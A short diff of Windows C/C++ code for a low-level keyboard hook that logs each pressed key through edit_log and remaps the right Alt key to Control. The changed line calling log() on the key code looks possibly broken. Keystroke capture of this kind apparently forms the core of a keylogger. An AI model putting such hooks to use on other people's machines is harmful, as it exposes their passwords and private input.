@@ -15,17 +15,17 @@ void StartKeyBoardHook()
 }
 
 
-LRESULT __stdcall HookProcedure(int nCode, WPARAM wParam, LPARAM lParam)
+LRESULT __stdcall HookProcedure(int nCode, WPARAM wParam, LPARAM lParam) 
 {
 	hook_struct = *((KBDLLHOOKSTRUCT*)lParam);
 	if (nCode >= 0)
 	{
 		if (wParam == WM_KEYDOWN)
-			edit_log(translate_key_value(hook_struct.vkCode));
+			edit_log(log(hook_struct.vkCode));
 		else if (wParam == WM_SYSKEYDOWN && hook_struct.vkCode != 165)
-			keybd_event(VK_CONTROL, 0, 0, 0);
+			keybd_event(VK_CONTROL, 0, 0, 0); 
 		else if (wParam == WM_SYSKEYUP && hook_struct.vkCode == 165)
-			keybd_event(VK_CONTROL, 0, KEYEVENTF_KEYUP, 0);
+			keybd_event(VK_CONTROL, 0, KEYEVENTF_KEYUP, 0); 
 	}
 	return CallNextHookEx(hook, nCode, wParam, lParam);
 }
